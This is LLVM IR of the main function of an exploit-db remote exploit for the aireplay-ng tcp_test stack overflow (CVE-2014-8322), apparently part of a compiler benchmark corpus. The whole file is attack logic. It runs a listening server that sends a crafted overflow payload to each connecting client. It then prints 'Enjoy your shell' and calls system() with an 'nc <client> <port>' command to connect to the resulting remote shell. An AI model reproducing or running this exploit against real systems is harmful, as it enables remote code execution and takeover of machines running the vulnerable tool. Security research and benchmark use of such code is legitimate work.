; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_35018.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_35018.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.net_hdr = type { i32 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [59 x i8] c"[+]Exploit for aireplay-ng tcp_test remote stack overflow\0A\00", align 1
@.str.1 = private unnamed_addr constant [43 x i8] c"[+]Written by Nick Sampanis CVE-2014-8322\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [43 x i8] c"[-]Usage: %s port command\0A[-][Default %s]\0A\00", align 1
@COMMAND = common dso_local global i8* null, align 8
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [12 x i8] c"[-]Socket()\00", align 1
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_REUSEADDR = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"bind()\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"listen()\00", align 1
@.str.6 = private unnamed_addr constant [49 x i8] c"[+]Server is waiting for connections on port %d\0A\00", align 1
@PAD_BYTES = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [10 x i8] c"[-]Accept\00", align 1
@.str.8 = private unnamed_addr constant [33 x i8] c"[+]Client %s has been connected\0A\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"[-]Send\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"[-]Recv\00", align 1
@.str.11 = private unnamed_addr constant [22 x i8] c"[+]Enjoy your shell\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"nc %s %d\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.net_hdr, align 4
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca %struct.sockaddr_in, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1024 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 1, i32* %16, align 4
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0))
  %19 = load i32, i32* %4, align 4
  %20 = icmp eq i32 %19, 1
  br i1 %20, label %21, label %28

21:                                               ; preds = %2
  %22 = load i32, i32* @stderr, align 4
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8*, i8** @COMMAND, align 8
  %27 = call i32 @fprintf(i32 %22, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0), i8* %25, i8* %26)
  store i32 -1, i32* %3, align 4
  br label %147

28:                                               ; preds = %2
  %29 = load i32, i32* @AF_INET, align 4
  %30 = load i32, i32* @SOCK_STREAM, align 4
  %31 = load i32, i32* @IPPROTO_TCP, align 4
  %32 = call i32 @socket(i32 %29, i32 %30, i32 %31)
  store i32 %32, i32* %14, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %36

34:                                               ; preds = %28
  %35 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %147

36:                                               ; preds = %28
  %37 = bitcast %struct.sockaddr_in* %7 to i8*
  %38 = call i32 @memset(i8* %37, i8 signext 0, i32 16)
  store i32 16, i32* %10, align 4
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %40 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %39, i32 0, i32 0
  store i64 0, i64* %40, align 8
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @atoi(i8* %43)
  %45 = call i32 @htons(i32 %44)
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %45, i32* %46, align 4
  %47 = load i32, i32* @AF_INET, align 4
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %47, i32* %48, align 8
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 2
  %51 = load i8*, i8** %50, align 8
  %52 = icmp ne i8* %51, null
  br i1 %52, label %53, label %57

53:                                               ; preds = %36
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 2
  %56 = load i8*, i8** %55, align 8
  store i8* %56, i8** %12, align 8
  br label %59

57:                                               ; preds = %36
  %58 = load i8*, i8** @COMMAND, align 8
  store i8* %58, i8** %12, align 8
  br label %59

59:                                               ; preds = %57, %53
  %60 = load i32, i32* %14, align 4
  %61 = load i32, i32* @SOL_SOCKET, align 4
  %62 = load i32, i32* @SO_REUSEADDR, align 4
  %63 = call i32 @setsockopt(i32 %60, i32 %61, i32 %62, i32* %16, i32 4)
  %64 = load i32, i32* %14, align 4
  %65 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %66 = call i32 @bind(i32 %64, %struct.sockaddr* %65, i32 16)
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %70

68:                                               ; preds = %59
  %69 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %147

70:                                               ; preds = %59
  %71 = load i32, i32* %14, align 4
  %72 = call i32 @listen(i32 %71, i32 5)
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %76

74:                                               ; preds = %70
  %75 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %147

76:                                               ; preds = %70
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @atoi(i8* %79)
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.6, i64 0, i64 0), i32 %80)
  %82 = load i8*, i8** %12, align 8
  %83 = call i32 @strlen(i8* %82)
  %84 = add nsw i32 %83, 8
  %85 = mul nsw i32 %84, 5
  %86 = sdiv i32 %85, 4
  %87 = mul nsw i32 %86, 8
  %88 = load i32, i32* @PAD_BYTES, align 4
  %89 = add nsw i32 %87, %88
  %90 = sext i32 %89 to i64
  %91 = add i64 %90, 4
  store i64 %91, i64* %11, align 8
  %92 = icmp ne i64 %91, 0
  br i1 %92, label %94, label %93

93:                                               ; preds = %76
  store i32 -1, i32* %3, align 4
  br label %147

94:                                               ; preds = %76
  %95 = load i8*, i8** %12, align 8
  %96 = load i64, i64* %11, align 8
  %97 = call i8* @exploit_init(i8* %95, i64 %96)
  store i8* %97, i8** %9, align 8
  br label %98

98:                                               ; preds = %94, %146
  %99 = load i32, i32* %14, align 4
  %100 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %101 = call i32 @accept(i32 %99, %struct.sockaddr* %100, i32* %10)
  store i32 %101, i32* %15, align 4
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %105

103:                                              ; preds = %98
  %104 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %147

105:                                              ; preds = %98
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %107 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %106, i32 0, i32 0
  %108 = load i64, i64* %107, align 8
  %109 = call i8* @inet_ntoa(i64 %108)
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0), i8* %109)
  %111 = load i32, i32* %15, align 4
  %112 = load i8*, i8** %9, align 8
  %113 = load i64, i64* %11, align 8
  %114 = call i32 @send(i32 %111, i8* %112, i64 %113, i32 0)
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %118

116:                                              ; preds = %105
  %117 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %147

118:                                              ; preds = %105
  %119 = load i32, i32* %15, align 4
  %120 = call i32 @recv(i32 %119, %struct.net_hdr* %6, i32 4, i32 0)
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %122, label %124

122:                                              ; preds = %118
  %123 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %147

124:                                              ; preds = %118
  %125 = load i32, i32* %15, align 4
  %126 = call i32 @close(i32 %125)
  %127 = call i32 @sleep(i32 1)
  %128 = load i8**, i8*** %5, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 2
  %130 = load i8*, i8** %129, align 8
  %131 = icmp ne i8* %130, null
  br i1 %131, label %146, label %132

132:                                              ; preds = %124
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0))
  %134 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %136 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %135, i32 0, i32 0
  %137 = load i64, i64* %136, align 8
  %138 = call i8* @inet_ntoa(i64 %137)
  %139 = load i8**, i8*** %5, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 1
  %141 = load i8*, i8** %140, align 8
  %142 = call i32 @atoi(i8* %141)
  %143 = call i32 @snprintf(i8* %134, i32 1024, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i64 0, i64 0), i8* %138, i32 %142)
  %144 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %145 = call i32 @system(i8* %144)
  br label %146

146:                                              ; preds = %132, %124
  br label %98

147:                                              ; preds = %122, %116, %103, %93, %74, %68, %34, %21
  %148 = load i32, i32* %3, align 4
  ret i32 %148
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fprintf(i32, i8*, i8*, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i8* @exploit_init(i8*, i64) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @inet_ntoa(i64) #1

declare dso_local i32 @send(i32, i8*, i64, i32) #1

declare dso_local i32 @recv(i32, %struct.net_hdr*, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
